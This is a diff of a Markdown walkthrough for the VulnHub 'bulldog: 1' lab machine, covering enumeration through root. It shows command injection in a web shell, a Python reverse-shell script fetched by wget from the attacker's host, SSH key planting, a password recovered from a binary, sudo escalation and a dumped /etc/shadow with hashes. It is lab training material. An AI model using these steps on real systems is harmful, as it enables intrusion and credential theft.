@@ -1,7 +1,9 @@
 [vulnhub - easy/medium] bulldog: 1
 ----------------------------------
 
-### enumeration
+[link to the machine]()
+
+### enumeration - external
 Since the machine's ip is already shown at its login page, I decide to check it on my browser to see if there's any useful information in it:
 
 ![bulldog 1](./images/bulldog-1.png)
@@ -57,7 +59,7 @@ Nmap done: 1 IP address (1 host up) scanned in 17.03 seconds
 zsh: segmentation fault  nmap -p 23,80,8080 -sC -sV -oA nmap_info_detailed 192.168.56.117
 ```
 
-The port 8080 is serving the same thing as the port 80, so I proceed to use gobuster to bruteforce probable directories.
+The port 8080 is serving the same thing as the port 80, so I proceed to use gobuster to bruteforce possible directories.
 
 ```bash
 ┌──(j㉿kali)-[~/Desktop/vulnhub/bulldog-1]
@@ -89,7 +91,7 @@ Progress: 63900 / 882244 (7.24%)                                                
 ===============================================================
 ```
 
-The /dev/ directory found by gobuster seems to have interesting information on it. At surface level, this is what it looks like:
+The /dev/ directory found by gobuster seems to have interesting information in it. At surface level, this is what it looks like:
 ![bulldog 2](./images/bulldog-2.png)
 
 And when trying to go to the "Web-Shell" link, what I get is:
@@ -131,6 +133,8 @@ When I go to the '/admin/' directory, it redirects me to '/admin/login/?next=/ad
 
 ![bulldog 4](./images/bulldog-4.png)
 
+
+### exploitation - external to internal
 I proceed to log-in with Username 'sarah' and Password 'bulldoglover'. After that I go to '/dev/' again, click on the "Web-Shell" link, and am redirected to:
 
 ![bulldog 5](./images/bulldog-5.png)
@@ -143,11 +147,11 @@ But as it is well known, we can use ';' to run one command and then the next, on
 
 ![bulldog 7](./images/bulldog-7.png)
 
-But there is another way, using and ampersand, so, running "pwd & whoami":
+But there is another way, using an ampersand, so, running "pwd& whoami":
 
 ![bulldog 8](./images/bulldog-8.png)
 
-And I get the info that the user serving the page is 'django', and also that the string sent is not clean enough, allowing for the ampersand to pass. So I proceed to plan a reverse shell. I check to see if the machine has php, by running
+And I get the info that the user serving the page is 'django', and also that the string sent is not clean enough, allowing for the ampersand to pass. So I proceed to plan a reverse shell. I check to see if the machine has php, by running:
 
 ```bash
 pwd& which php
@@ -159,9 +163,9 @@ But the server returns status 500, which I think means that it doesn't have php 
 pwd& which python
 ```
 
-And it returns the path to python, which can be used for a reverse shell. But it shouldn't be a one-line reverse shell because the input doesn't allow it, so I must create a revshell.py on my machine, that reads:
+And it returns the path to python, which can be used for a reverse shell. But it shouldn't be a one-line reverse shell because the input doesn't allow it, so I must create a 'revshell.py' file on my machine, that reads:
 
-```python
+```
 ┌──(j㉿kali)-[~/Desktop/TOOLS]
 └─$ cat revshell.py
 import socket,os,pty
@@ -173,7 +177,7 @@ os.dup2(s.fileno(),2)
 pty.spawn("/bin/sh")
 ```
 
-And serve it on through python's simpleHTTPserver and download it through wget on the victim machine, so, on my local machine:
+And serve it on through python's simpleHTTPserver and download it through wget on the target machine, so, on my local machine:
 
 ```bash
 ┌──(j㉿kali)-[~/Desktop/TOOLS]
@@ -187,7 +191,7 @@ And run the following on the '/dev/shell':
 pwd& wget 192.168.56.1:9000/revshell.py
 ```
 
-Now i listen to get the reverse shell on my local machine:
+Now I listen to get the reverse shell on my local machine:
 
 ```bash
 ┌──(j㉿kali)-[~/Desktop/vulnhub/bulldog-1]
@@ -223,29 +227,54 @@ bash: /root/.bashrc: Permission denied
 django@bulldog:/home/django/bulldog$ 
 ```
 
-I snoop around on the /home folder, it has three users: /root, /bulldogadmin and /django, I'm currently user 'django'. /bulldogadmin is accessible, and when I list its files:
+I then create a ssh key pair on my host machine, create the '/home/django/.ssh' folder, and echo my public key into the '/home/django/.ssh/authorized_keys' file, both creating it and writing on it. Then i manage to log in via SSH to the target machine:
+
+```
+┌──(j㉿kali)-[~/Desktop/vulnhub/bulldog-1/keys]
+└─$ ssh -i id_rsa django@192.168.56.117 -p 23
+The authenticity of host '[192.168.56.117]:23 ([192.168.56.117]:23)' can't be established.
+ED25519 key fingerprint is SHA256:WDuaz15lEopqS8zRj/BEBWb0cXBXoKW/ZM1CuJpUErg.
+This key is not known by any other names
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '[192.168.56.117]:23' (ED25519) to the list of known hosts.
+Welcome to Ubuntu 16.04.3 LTS (GNU/Linux 4.4.0-87-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+42 packages can be updated.
+22 updates are security updates.
+
+
+Last login: Wed Sep 20 19:35:44 2017
+django@bulldog:~$ ls
+```
+
+### enumeration - internal
+
+I snoop around on the /home folder, it has two users: /bulldogadmin and /django, I'm currently user 'django'. /bulldogadmin is accessible, and when I list its files:
 
 ```bash
 django@bulldog:/home/bulldogadmin$ ls -la
-ls -la
 total 40
-drwxr-xr-x 5 bulldogadmin bulldogadmin 4096 Sep 21  2017 .
+drwxr-xr-x 5 bulldogadmin bulldogadmin 4096 Sep 20  2017 .
 drwxr-xr-x 4 root         root         4096 Aug 24  2017 ..
 -rw-r--r-- 1 bulldogadmin bulldogadmin  220 Aug 24  2017 .bash_logout
 -rw-r--r-- 1 bulldogadmin bulldogadmin 3771 Aug 24  2017 .bashrc
 drwx------ 2 bulldogadmin bulldogadmin 4096 Aug 24  2017 .cache
-drwxrwxr-x 2 bulldogadmin bulldogadmin 4096 Sep 21  2017 .hiddenadmindirectory
-drwxrwxr-x 2 bulldogadmin bulldogadmin 4096 Aug 25  2017 .nano
+drwxrwxr-x 2 bulldogadmin bulldogadmin 4096 Sep 20  2017 .hiddenadmindirectory
+drwxrwxr-x 2 bulldogadmin bulldogadmin 4096 Aug 24  2017 .nano
 -rw-r--r-- 1 bulldogadmin bulldogadmin  655 Aug 24  2017 .profile
--rw-rw-r-- 1 bulldogadmin bulldogadmin   66 Aug 25  2017 .selected_editor
+-rw-rw-r-- 1 bulldogadmin bulldogadmin   66 Aug 24  2017 .selected_editor
 -rw-r--r-- 1 bulldogadmin bulldogadmin    0 Aug 24  2017 .sudo_as_admin_successful
 -rw-rw-r-- 1 bulldogadmin bulldogadmin  217 Aug 24  2017 .wget-hsts
 ```
 
-I find the .hiddenadmindirectory, that is also accessible. There is file 'note' inside of it that reads:
-```bash
-django@bulldog:/home/bulldogadmin/.hiddenadmindirectory$ cat note
-cat note
+I find the .hiddenadmindirectory, that is also accessible. Inside of it there's a binary named 'customPermissionApp', and a text file named 'note' that reads:
+
+```
+django@bulldog:/home/bulldogadmin/.hiddenadmindirectory$ cat note 
 Nick,
 
 I'm working on the backend permission stuff. Listen, it's super prototype but I think it's going to work out great. Literally run the app, give your account password, and it will determine if you should have access to that file or not! 
@@ -257,3 +286,94 @@ Let me know what you think of it!
 -Ashley
 ```
 
+I cannot execute nor change the binary, only read it, and since it is a prototype, its juicy strings are probably exposed somehow, so I run:
+```
+
+django@bulldog:/home/bulldogadmin/.hiddenadmindirectory$ strings customPermissionApp 
+[RELEVANT SECTION]
+GLIBC_2.4
+GLIBC_2.2.5
+UH-H
+SUPERultH
+imatePASH
+SWORDyouH
+CANTget
+dH34%(
+AWAVA
+AUATL
+[]A\A]A^A_
+Please enter a valid username to use root privileges
+        Usage: ./customPermissionApp <username>
+sudo su root
+;*3$"
+[RELEVANT SECTION]
+```
+
+### exploitation - internal - privesc
+
+And find this piece: 'SUPERultH imatePASH SWORDyouH CANTget', which is a string that got messed up by the binary, and probably reads: 'SUPERultimatePASSWORDyouCANTget'. On the note Ashley said she was about to get it working with user Django, so, testing the password with django:
+
+```
+django@bulldog:/home/bulldogadmin/.hiddenadmindirectory$ su django 
+Password: 
+django@bulldog:/home/bulldogadmin/.hiddenadmindirectory$ 
+```
+
+No error message, which means it worked! 
+So I go and execute the 'sudo -l' command that was blocked before because it required the password for user django:
+
+```
+django@bulldog:/home/bulldogadmin/.hiddenadmindirectory$ sudo -l
+[sudo] password for django: 
+Matching Defaults entries for django on bulldog:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User django may run the following commands on bulldog:
+    (ALL : ALL) ALL
+```
+
+And it is amazing news, it means I can run all commands as all users in this machine, so I run:
+
+```
+django@bulldog:/home/bulldogadmin/.hiddenadmindirectory$ sudo -u root /bin/bash
+root@bulldog:/home/bulldogadmin/.hiddenadmindirectory#
+```
+
+And like so I get the root user, proof:
+
+```
+root@bulldog:~/bulldog# cat /etc/shadow
+root:!:17402:0:99999:7:::
+daemon:*:17379:0:99999:7:::
+bin:*:17379:0:99999:7:::
+sys:*:17379:0:99999:7:::
+sync:*:17379:0:99999:7:::
+games:*:17379:0:99999:7:::
+man:*:17379:0:99999:7:::
+lp:*:17379:0:99999:7:::
+mail:*:17379:0:99999:7:::
+news:*:17379:0:99999:7:::
+uucp:*:17379:0:99999:7:::
+proxy:*:17379:0:99999:7:::
+www-data:*:17379:0:99999:7:::
+backup:*:17379:0:99999:7:::
+list:*:17379:0:99999:7:::
+irc:*:17379:0:99999:7:::
+gnats:*:17379:0:99999:7:::
+nobody:*:17379:0:99999:7:::
+systemd-timesync:*:17379:0:99999:7:::
+systemd-network:*:17379:0:99999:7:::
+systemd-resolve:*:17379:0:99999:7:::
+systemd-bus-proxy:*:17379:0:99999:7:::
+syslog:*:17379:0:99999:7:::
+_apt:*:17379:0:99999:7:::
+lxd:*:17402:0:99999:7:::
+messagebus:*:17402:0:99999:7:::
+uuidd:*:17402:0:99999:7:::
+dnsmasq:*:17402:0:99999:7:::
+bulldogadmin:$6$ptDAOrmL$WXhC9QKOwroIsYRs/OV3HaXpVyC9YhPV2wbZ/4ukeQhxAPi0Owwz1t8ApjGS9lEhSMYLJCiRZt4O/ri07NrJd/:17402:0:99999:7:::
+django:$6$rxxY3Uul$vOG9E/eGcT96nnz13uzJIdoKqkU5Ci6Uy3I5OG6NfIFrWOi8zALmZTJSZFRRiA2sdQ6jVDUMCjNUHOq.O.M46/:17402:0:99999:7:::
+sshd:*:17404:0:99999:7:::
+```
+
+Shout out to [@frichette_n](https://twitter.com/Frichette_n) on Twitter for making this machine.
